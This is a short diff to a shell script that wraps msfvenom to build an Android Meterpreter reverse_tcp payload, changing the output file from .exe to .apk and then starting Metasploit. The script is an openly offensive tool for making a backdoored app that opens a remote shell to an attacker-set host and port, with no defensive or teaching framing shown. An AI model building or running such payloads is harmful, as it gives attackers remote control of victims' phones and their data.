@@ -25,8 +25,8 @@ read name
 echo " "
 
 printf " \e[101m\e[1;73m _-_-_-_ WAIT PAYlOAD IS RUNNING _-_-_-_ \e[0m" 
-echo " "
-msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.exe
+echo 
+msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.apk
 
 printf " \e[101m\e[1;73m WAIT METASPLOIT RUNNING \e[0m\n"
 sleep 2
